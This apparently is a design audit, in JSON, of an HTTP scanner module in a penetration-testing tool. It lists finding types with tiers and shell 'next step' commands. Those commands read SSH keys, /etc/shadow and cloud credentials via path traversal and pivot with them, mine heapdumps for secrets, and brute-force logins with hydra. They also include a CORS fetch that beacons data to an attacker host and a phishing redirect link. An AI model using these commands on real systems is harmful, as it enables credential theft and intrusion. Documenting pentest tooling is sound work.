@@ -1,0 +1,206 @@
+{
+  "service": "http",
+  "module_files": [
+    "recce/services/http.py"
+  ],
+  "summary": "http.py is the stdlib-only deep HTTP scanner: path enum, framework fingerprint, actuator, methods, CORS, WebDAV shim, cache-poison, CRLF, open-redirect, nginx alias-traversal, JS secrets, backup variants. Most findings sit at T1 (deterministic-signal disclosure/misconfig) with two solid T2s (nginx alias traversal proves /etc/passwd read; JS secrets are extracted credential material). Biggest gap: no session/foothold step \u2014 actuator/env, JS secrets and default-cred hints (tomcat/grafana) never chain into an actual login attempt or heapdump-mining flow.",
+  "proposed_shared_surface_consumers": [
+    "known_users",
+    "loot_credentials",
+    "product_versions",
+    "known_paths"
+  ],
+  "findings": [
+    {
+      "kind": "http-path-enum",
+      "title_pattern": "Exposed path: <path>",
+      "tier": "t1",
+      "severity": "high",
+      "tier_evidence": "Bounded curated wordlist with catch-all suppression; a hit deterministically means the file responded 200/401/403 with a signature \u2014 same class as an ftp anon listing.",
+      "can_promote_to": "t2",
+      "promotion_notes": "For high-value hits (.env, .aws/credentials, wp-config, terraform.tfstate, backup.sql) fetch body, run the loot/regex extractor and register captured secrets to the credential store \u2014 that turns disclosure into extracted material (T2).",
+      "promotion_risk": "none",
+      "tester_next_step": "curl -sSk http://IP:PORT/.git/HEAD ; for p in .env .aws/credentials terraform.tfstate backup.sql wp-config.php; do curl -sSk http://IP:PORT/$p | head -60; done ; if .git/HEAD present run: git-dumper http://IP:PORT/.git /tmp/gitdump && trufflehog filesystem /tmp/gitdump",
+      "related_cves": []
+    },
+    {
+      "kind": "http-backup-variant",
+      "title_pattern": "Backup variant exposed: <path>",
+      "tier": "t1",
+      "severity": "high",
+      "tier_evidence": "Only fires on seed disclosure hits whose backup suffix returns non-catchall 200 \u2014 deterministic present/absent.",
+      "can_promote_to": "t2",
+      "promotion_notes": "Grep the backup body for the loot patterns already in loot.py (_ENV_PASS_RE, _URL_CRED_RE) \u2014 same pathway as .env extraction.",
+      "promotion_risk": "none",
+      "tester_next_step": "curl -sSk http://IP:PORT/config.php.bak > /tmp/cfg.bak ; grep -Ei 'password|secret|api_?key|db_' /tmp/cfg.bak"
+    },
+    {
+      "kind": "http-nginx-alias",
+      "title_pattern": "nginx alias-traversal \u2014 arbitrary file read via <path>",
+      "tier": "t2",
+      "severity": "critical",
+      "tier_evidence": "Probe returns /etc/passwd content matched by 'root:x:0:0:' \u2014 actual file read proven, not banner.",
+      "can_promote_to": "t3",
+      "promotion_notes": "Chain a follow-up read of /root/.ssh/id_rsa, /home/*/.ssh/id_rsa, /var/www/*/.env, /root/.aws/credentials via the same primitive and hand the loot to the credential/SSH pivot.",
+      "promotion_risk": "low",
+      "tester_next_step": "for p in /root/.ssh/id_rsa /home/ubuntu/.ssh/id_rsa /var/www/.env /root/.aws/credentials /etc/shadow; do curl -sSk http://IP:PORT/static../$p ; done # if id_rsa lands: chmod 600 loot.key; ssh -i loot.key user@target",
+      "related_cves": [
+        "CVE-2018-16843"
+      ]
+    },
+    {
+      "kind": "http-js-secrets",
+      "title_pattern": "Secrets/hardcoded endpoints in JS bundle: <src>",
+      "tier": "t2",
+      "severity": "critical",
+      "tier_evidence": "AWS/GitHub/Stripe/JWT regex hits are extracted material \u2014 the secret pattern IS the loot, not merely a fingerprint.",
+      "can_promote_to": "t3",
+      "promotion_notes": "Register the matched string as a Credential (kind=api-token / kind=aws-key) so credential-spray and cloud-metadata probes can pivot to actual IAM enumeration.",
+      "promotion_risk": "low",
+      "tester_next_step": "SECRET=$(curl -sSk http://IP:PORT/bundle.js | grep -Eo 'AKIA[0-9A-Z]{16}|gh[oprs]_[A-Za-z0-9]{36,}|sk_live_[A-Za-z0-9]{20,}' | head -1) ; if [[ $SECRET == AKIA* ]]; then aws sts get-caller-identity --profile leaked ; fi"
+    },
+    {
+      "kind": "http-actuator",
+      "title_pattern": "Spring Boot Actuator exposed: <path>",
+      "tier": "t2",
+      "severity": "high",
+      "tier_evidence": "actuator_probe validates the response is a real hprof binary (>100KB) or JSON-shaped payload \u2014 a T2 confirmation for heapdump/env, T1 for surface-only paths.",
+      "can_promote_to": "t3",
+      "promotion_notes": "Download heapdump, run `strings heap.hprof | grep -Ei 'password|secret|token|jdbc:'` and fold recovered creds into the credential store; POST /loggers/root=TRACE then read /actuator/logfile to capture live sessions.",
+      "promotion_risk": "medium",
+      "tester_next_step": "curl -sSk http://IP:PORT/actuator/env | jq . ; curl -sSk -o heap.hprof http://IP:PORT/actuator/heapdump && strings heap.hprof | grep -Ei 'password|secret|jdbc:|Bearer ' | sort -u | head -80"
+    },
+    {
+      "kind": "http-method-trace",
+      "title_pattern": "HTTP TRACE method reflects request (XST)",
+      "tier": "t1",
+      "severity": "medium",
+      "tier_evidence": "TRACE echoed User-Agent \u2014 probe succeeds only when server actually reflects headers (deterministic).",
+      "can_promote_to": "stay",
+      "promotion_notes": "XST is a client-side primitive; no meaningful server-side promotion.",
+      "promotion_risk": "none",
+      "tester_next_step": "curl -sSk -X TRACE -H 'X-Steal: canary' http://IP:PORT/ | grep -i x-steal"
+    },
+    {
+      "kind": "http-method-writable",
+      "title_pattern": "Writable/tunneling HTTP methods accepted",
+      "tier": "t0",
+      "severity": "medium",
+      "tier_evidence": "Only proves the verb is routed (baseline-diff), not that a write actually lands.",
+      "can_promote_to": "t2",
+      "promotion_notes": "Add the PUT/GET/DELETE roundtrip that web/__init__.py._prove_put already does; a canary read-back confirms write. That is the promotion \u2014 same code, wired from http.py.",
+      "promotion_risk": "low",
+      "tester_next_step": "curl -sSk -X PUT --data 'recce-canary' http://IP:PORT/recce_probe.txt ; curl -sSk http://IP:PORT/recce_probe.txt ; curl -sSk -X DELETE http://IP:PORT/recce_probe.txt"
+    },
+    {
+      "kind": "http-cors-reflect",
+      "title_pattern": "CORS reflects any origin with credentials",
+      "tier": "t1",
+      "severity": "high",
+      "tier_evidence": "ACAO reflection + Allow-Credentials:true is a deterministic misconfig probe.",
+      "can_promote_to": "stay",
+      "promotion_notes": "Client-side primitive \u2014 no promotion without a victim browser.",
+      "promotion_risk": "none",
+      "tester_next_step": "curl -sSk -H 'Origin: https://attacker.example' -D- http://IP:PORT/api/whoami | grep -i access-control ; host on evil.example a page that fetch(url,{credentials:'include'}).then(r=>r.text()).then(t=>navigator.sendBeacon('//attacker/','..'+t))"
+    },
+    {
+      "kind": "http-cache-poison",
+      "title_pattern": "Reflected header primitive: <hdr> \u2192 <where>",
+      "tier": "t1",
+      "severity": "medium",
+      "tier_evidence": "Canary appearance confirms reflection; caching layer is unverified so it stays T1.",
+      "can_promote_to": "t2",
+      "promotion_notes": "Add a cache-key discriminator (Age, X-Cache) check: a second identical request within 5s returning Age>0 with the poisoned body confirms cache poisoning (T2).",
+      "promotion_risk": "medium",
+      "tester_next_step": "curl -sSk -H 'X-Forwarded-Host: attacker.recce' -D- http://IP:PORT/ ; sleep 2 ; curl -sSk -D- http://IP:PORT/ | grep -Ei 'age:|x-cache|attacker'"
+    },
+    {
+      "kind": "http-webdav",
+      "title_pattern": "WebDAV PROPFIND accepted at <path>",
+      "tier": "t1",
+      "severity": "medium",
+      "tier_evidence": "207 multistatus response is a deterministic 'DAV enabled' signal.",
+      "can_promote_to": "t2",
+      "promotion_notes": "Chain to services/webdav.py.anonymous_put_proof \u2014 proven write is T2, PUT+execute is T3.",
+      "promotion_risk": "medium",
+      "tester_next_step": "curl -sSk -X PROPFIND -H 'Depth: 1' http://IP:PORT/webdav/ ; curl -sSk -X PUT --data 'x' http://IP:PORT/webdav/recce.txt && curl -sSk http://IP:PORT/webdav/recce.txt"
+    },
+    {
+      "kind": "http-open-redirect",
+      "title_pattern": "Open redirect: <path>?<param>=",
+      "tier": "t1",
+      "severity": "medium",
+      "tier_evidence": "3xx Location leaking canary host is a deterministic primitive.",
+      "can_promote_to": "stay",
+      "promotion_notes": "Client-side/phishing primitive; no server-side promotion without OAuth-flow context.",
+      "promotion_risk": "none",
+      "tester_next_step": "curl -sSk -D- 'http://IP:PORT/login?next=https://attacker.tld/x' | grep -i location ; craft phishing: https://IP/login?next=https://phish.attacker.tld/o365"
+    },
+    {
+      "kind": "http-crlf-injection",
+      "title_pattern": "CRLF header injection via URL parameter",
+      "tier": "t1",
+      "severity": "high",
+      "tier_evidence": "Injected header appears in response \u2014 deterministic split.",
+      "can_promote_to": "t2",
+      "promotion_notes": "Follow up with a Set-Cookie split (session fixation) or Location-header override; a cache-poison chain moves this to T2 when a shared cache is present.",
+      "promotion_risk": "medium",
+      "tester_next_step": "curl -sSki 'http://IP:PORT/?x=%0d%0aSet-Cookie:%20SESSION=attacker' | grep -i set-cookie"
+    },
+    {
+      "kind": "http-api-spec",
+      "title_pattern": "<KIND> spec exposed at <path>",
+      "tier": "t0",
+      "severity": "info",
+      "tier_evidence": "Presence of a spec is surface enumeration; no exploitation on its own.",
+      "can_promote_to": "t1",
+      "promotion_notes": "Parse spec, hit every unauth GET endpoint (already done in api.py) \u2014 that's the T1 promotion; fold api.py._spec_findings back through here.",
+      "promotion_risk": "low",
+      "tester_next_step": "curl -sSk http://IP:PORT/openapi.json | jq '.paths | keys[]' | head -40 ; for p in $(...); do curl -sSk -o /dev/null -w '%{http_code} %{url}\\n' http://IP:PORT$p; done"
+    },
+    {
+      "kind": "http-directory-listing",
+      "title_pattern": "Directory listing enabled: <path>",
+      "tier": "t1",
+      "severity": "medium",
+      "tier_evidence": "autoindex markers match the actual HTML \u2014 deterministic.",
+      "can_promote_to": "t2",
+      "promotion_notes": "Walk the listing, grep filenames for backup/config/dump patterns and download \u2192 captured content is T2.",
+      "promotion_risk": "none",
+      "tester_next_step": "wget -r -np -l 3 http://IP:PORT/backup/ && grep -Elr 'password|secret|BEGIN.*PRIVATE KEY' ./IP:PORT/"
+    },
+    {
+      "kind": "http-forms",
+      "title_pattern": "HTML forms discovered: <n>",
+      "tier": "t0",
+      "severity": "info",
+      "tier_evidence": "Passive parse of <form>.",
+      "can_promote_to": "t1",
+      "promotion_notes": "Hand to sqli.py.test_form (already opt-in) for GET-parameter SQLi; that is a native T1 promotion.",
+      "promotion_risk": "medium",
+      "tester_next_step": "RECCE_ACTIVE_ATTACKS=1 python -c 'from recce.services.sqli import test_form; print(test_form(\"http://IP:PORT/login\",\"POST\",[\"user\",\"pass\"],active_attacks=True))'"
+    },
+    {
+      "kind": "http-default-creds",
+      "title_pattern": "Login form with known default credentials: <path>",
+      "tier": "t0",
+      "severity": "medium",
+      "tier_evidence": "Hint only \u2014 no attempt is made.",
+      "can_promote_to": "t3",
+      "promotion_notes": "Actually POST the hinted creds and check auth cookie return / redirect \u2014 a working default cred is T3 (foothold). Reuse web/auth.py:_form_login.",
+      "promotion_risk": "medium",
+      "tester_next_step": "hydra -L users.txt -P /usr/share/wordlists/rockyou.txt IP http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^:S=302' -f"
+    },
+    {
+      "kind": "http-header-hygiene",
+      "title_pattern": "Version-disclosing HTTP headers / Weak CSP",
+      "tier": "t0",
+      "severity": "low",
+      "tier_evidence": "Header inspection; no exploitation.",
+      "can_promote_to": "t1",
+      "promotion_notes": "Feed disclosed version strings into offline CVE DB (known_products surface) \u2014 a version\u2192CVE hit is a T1 candidate.",
+      "promotion_risk": "none",
+      "tester_next_step": "curl -sSkI http://IP:PORT/ ; searchsploit nginx 1.18"
+    }
+  ]
+}
